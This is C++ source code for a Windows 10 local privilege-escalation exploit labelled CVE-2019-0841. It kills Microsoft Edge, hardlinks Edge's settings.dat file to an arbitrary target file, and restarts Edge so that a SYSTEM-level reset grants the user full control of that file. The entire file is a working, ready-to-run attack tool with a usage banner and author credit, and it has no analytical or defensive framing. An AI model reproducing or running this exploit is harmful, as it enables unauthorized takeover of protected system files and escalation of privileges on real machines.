// ACLtakeoverLPE.cpp : Defines the entry point for the console application.
//
#include "stdafx.h"
#include "CommonUtils.h"
#include "ntimports.h"
#include "typed_buffer.h"
#include <TlHelp32.h>
#include <tchar.h>
#include "winbase.h"
#include <wchar.h>
#include <Windows.h>
#include <string>
#include <filesystem>
#include <aclapi.h>
#include <iostream>
#include <fstream>
#include <iostream>
#include "base64.h"
#include <atlbase.h>
#include <atlconv.h>
#include "resource2.h"
#pragma comment(lib, "advapi32.lib")
#ifndef UNICODE  
typedef std::string String;
#else
typedef std::wstring String;
#endif


bool CheckFilePermissions(_TCHAR* target) {
	_tprintf(_T("[+] Checking File privileges of %s\n"), target);
	FILE *fp = _wfopen(target, TEXT("a"));
	if (fp == NULL) {
		if (errno == EACCES) {
			std::cerr << "[+] You don't have 'Modify/Write' privileges on this file ..." << std::endl;
			return false;
		}
		else {
			std::cerr << "[+] Something went wrong: " << strerror(errno) << std::endl;
			return false;
		}
	}
	else {
		printf("[+] You have 'Full Control' over this file!\n");
		return true;
	}
}

bool CreateNativeHardlink(LPCWSTR linkname, LPCWSTR targetname)
{
	std::wstring full_linkname = BuildFullPath(linkname, true);
	size_t len = full_linkname.size() * sizeof(WCHAR);

	typed_buffer_ptr<FILE_LINK_INFORMATION> link_info(sizeof(FILE_LINK_INFORMATION) + len - sizeof(WCHAR));

	memcpy(&link_info->FileName[0], full_linkname.c_str(), len);
	link_info->ReplaceIfExists = TRUE;
	link_info->FileNameLength = len;

	std::wstring full_targetname = BuildFullPath(targetname, true);

	HANDLE hFile = OpenFileNative(full_targetname.c_str(), nullptr, MAXIMUM_ALLOWED, FILE_SHARE_READ, 0);
	if (hFile)
	{
		DEFINE_NTDLL(ZwSetInformationFile);
		IO_STATUS_BLOCK io_status = { 0 };

		NTSTATUS status = fZwSetInformationFile(hFile, &io_status, link_info, link_info.size(), FileLinkInformation);
		CloseHandle(hFile);
		if (NT_SUCCESS(status))
		{
			return true;
		}
		SetNtLastError(status);
	}

	return false;
}

bool IsProcessRunning(const wchar_t* processName) {
	bool exists = false;
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry))
		while (Process32Next(snapshot, &entry)) {
			if (!wcsicmp(entry.szExeFile, processName))
				exists = true;
		}

	CloseHandle(snapshot);
	return exists;
}

void killProcessByName(const wchar_t* filename)
{
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
	PROCESSENTRY32 pEntry;
	pEntry.dwSize = sizeof(pEntry);
	BOOL hRes = Process32First(hSnapShot, &pEntry);
	while (hRes)
	{
		if (wcscmp(pEntry.szExeFile, filename) == 0)
		{
			HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
				(DWORD)pEntry.th32ProcessID);
			if (hProcess != NULL)
			{
				TerminateProcess(hProcess, 9);
				CloseHandle(hProcess);
			}
		}
		hRes = Process32Next(hSnapShot, &pEntry);
	}
	CloseHandle(hSnapShot);
}

bool FileExists(const wchar_t* file) {
	if (INVALID_FILE_ATTRIBUTES == GetFileAttributes(file) && GetLastError() == ERROR_FILE_NOT_FOUND)
	{
		return false;
	}
	else {
		return true;
	}
}

bool CreateHardlink(_TCHAR* src, _TCHAR* dst) {
	if (CreateNativeHardlink(src, dst))
	{
		//printf("[+] Done!\n");
		return true;

	}
	else
	{
		printf("Error creating hardlink: %ls\n", GetErrorMessage().c_str());
		return false;
	}
}

void killEdge() {
	if (IsProcessRunning(L"MicrosoftEdge.exe")) {
		while (IsProcessRunning(L"MicrosoftEdge.exe")) {
			printf("[!] Microsoft Edge is running :(\n");
			printf("[!] File is in use by NT AUTHORITY\\SYSTEM ...\n");
			printf("[!] Killing Microsoft Edge ... ");
			killProcessByName(L"MicrosoftEdge.exe");
			printf("DONE\n");
			printf("[+] Retrying ...\n");
		}
	}
	else {
		printf("[+] Microsoft Edge is not running :)\n");
	}
}

void gimmeroot(_TCHAR* targetpath, bool hijack) {
	wchar_t *userprofile = _wgetenv(L"USERPROFILE");
	wchar_t *relpath = (L"\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\Settings\\settings.dat"); //MS Edge Settings file location
	std::wstring fullpath(userprofile);
	fullpath += std::wstring(relpath);
	TCHAR * szBuffsrc = (wchar_t *)fullpath.c_str(); //MS Edge Settings file

	if (CheckFilePermissions(targetpath)) {
		exit(EXIT_FAILURE);
	}
	killEdge();
	printf("[+] Checking if 'settings.dat' file exists ... ");
	if (FileExists(szBuffsrc)) {
		printf("YES\n");
		printf("[!] Attempting to create a hardlink to target ... ");
		if (CreateHardlink(szBuffsrc, targetpath)) {
			printf("DONE\n");
		}
		Sleep(3000);
		printf("[+] Starting up Microsoft Edge to force reset ...\n");
		try {
			system("start microsoft-edge:");
		}
		catch (...) {

		}
		Sleep(3000);
		printf("[!] Killing Microsoft Edge again ... \n");
		killProcessByName(L"MicrosoftEdge.exe");
		_tprintf(_T("[+] Checking File privileges again ...\n"));
		if (!CheckFilePermissions(targetpath)) {
			printf("[!] File Takeover Failed! \n");
			printf("[!] File might be in use by another process or NT AUTHORITY\\SYSTEM does not have 'Full Control' permissions on the file! \n");
			printf("[!] Try another file ... \n");
		}
	}
}

int _tmain(int argc, _TCHAR* argv[])
{

	if (argc < 2) {
		printf("# Privileged DACL Overwrite EoP\n");
		printf("# CVE: CVE-2019-0841\n");
		printf("# Exploit Author: Nabeel Ahmed (@rogue_kdc)\n");
		printf("# Tested on: Microsoft Windows 10 x32 & x64\n");
		printf("# Category: Local\n");
		printf("-------------------------------------------------\n");
		printf("[+] Usage: exploit.exe <path to file to takeover>\n");
		printf("[+] (E.g., exploit.exe C:\\Windows\\win.ini\n");
		printf("-------------------------------------------------\n");
	}
	else {
		try {
			if (argc < 3) {
				printf("# Privileged DACL Overwrite EoP\n");
				printf("# CVE: CVE-2019-0841\n");
				printf("# Exploit Author: Nabeel Ahmed (@rogue_kdc)\n");
				printf("# Tested on: Microsoft Windows 10 x32 & x64\n");
				printf("# Category: Local\n");
				printf("-------------------------------------------------\n");
				printf("\n");
				printf("\n");
				gimmeroot(argv[1],false);
			}

		}
		catch (...) {

		}
	}


	exit(0);
}





